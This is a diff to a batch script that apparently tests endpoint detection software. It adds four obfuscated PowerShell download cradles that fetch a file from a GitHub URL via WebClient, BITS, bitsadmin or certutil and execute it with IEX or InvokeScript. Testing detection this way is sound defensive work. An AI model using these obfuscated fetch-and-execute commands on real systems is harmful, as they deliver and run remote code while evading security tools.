@@ -563,7 +563,37 @@ start "" cmd /c powershell -c "SV c3z 'https://raw.githubusercontent.com/op7ic/E
 echo Execution Finished at %time% %date%
 timeout 5
 
+echo %time% %date% [+] Testing DISK\PSWEBFILE exec
+start "" cmd /c powershell -c "SI Variable:\9 'Net.WebClient';SV iH 'Default_File_Path.ps1';Set-Item Variable:gE 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';sl;SI Variable:/g (.(Variable *uti*t).Value.(((Variable *uti*t).Value|Member)[6].Name).(((Variable *uti*t).Value.(((Variable *uti*t).Value|Member)[6].Name)|Member|Where-Object{(Variable _ -ValueO).Name-like'G*ts'}).Name).Invoke('Ne*ct')(Variable 9).Value);SI Variable:h20 ((((Get-Item Variable:/g).Value|Member)|Where-Object{(Variable _ -ValueO).Name-like'Do*o*d*le'}).Name);(Get-Item Variable:/g).Value.((GV h20).Value).Invoke((GCI Variable:\gE).Value,(Variable iH -Val));(Variable *uti*t).Value.(((Variable *uti*t).Value|Member)[6].Name).InvokeScript((-Join([Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes((Variable iH -Val))))))"
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing DISK\PSBITS exec
+start "" cmd /c powershell -c "Set-Variable pD5 'Default_File_Path.ps1';SI Variable:YD2 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';$NULL=Help(Get-Command *ar*Bi*s*);.(Get-Command *ar*Bi*s*)-So (Get-Variable YD2 -ValueOn) -Destina (DIR Variable:/pD5).Value;$ExecutionContext|ForEach{(Get-ChildItem Variable:_).Value.(($ExecutionContext|GM)[6].Name)|ForEach{(Get-Item Variable:/_).Value.InvokeScript((([Char[]](GC -En 3 (DIR Variable:/pD5).Value))-Join''))}}"
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing DISK\BITSADMIN exec
+start "" cmd /c powershell -c "Set-Item Variable:\PL2 'Default_File_Path.ps1';SV 69x 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';$NULL=bitsadmin /transfer /ybBUL (LS Variable:69x).Value (GV PL2).Value;([String]::Join('',((GC -Encodin 3 (GV PL2).Value)|ForEach{[Char](GI Variable:_).Value})))|IEX"
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing DISK\CERTUTIL exec
+start "" cmd /c powershell -c "Set-Variable T2Z 'Default_File_Path.ps1';SV kz1 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';$NULL=C:\Windows\System32\certutil -urlcache /f (Get-Variable kz1).Value (Get-Variable T2Z -ValueOn);&(Get-Alias *EX)(([System.String]::Join('',([Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes((Get-Variable T2Z -ValueOn)))))))"
+echo Execution Finished at %time% %date%
+timeout 5
+
 REM ---- EOF Invoke-CradleCrafter Payloads ----
+
+
+echo **********************************************
+echo *         Testing EXTRA PAYLOADS             *
+echo **********************************************
+
+
+
+
+
 
 echo [+] Let tasks finish before deleting all the files
 
